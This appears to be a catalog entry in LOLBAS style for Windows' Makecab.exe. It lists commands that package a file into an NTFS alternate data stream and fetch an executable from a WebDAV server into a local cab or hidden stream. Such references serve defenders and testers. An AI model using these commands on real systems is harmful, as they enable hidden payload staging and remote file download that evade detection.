---
Name: Makecab.exe
Description: Package, Add ADS, Download
Author: ''
Created: '2018-05-25'
Categories: []
Commands:
  - Command: makecab c:\ADS\autoruns.exe c:\ADS\cabtest.txt:autoruns.cab
    Description: ''
  - Command: |
          makecab \\webdavserver\webdav\file.exe C:\Folder\file.cab
          makecab \\webdavserver\webdav\file.exe C:\Folder\file.txt:file.cab
    Description: ''
Full Path:
  - c:\windows\system32\makecab.exe
  - c:\windows\sysWOW64\makecab.exe
Code Sample: []
Detection: []
Resources:
  - https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f
Notes: Thanks to Oddvar Moe - @oddvarmoe
---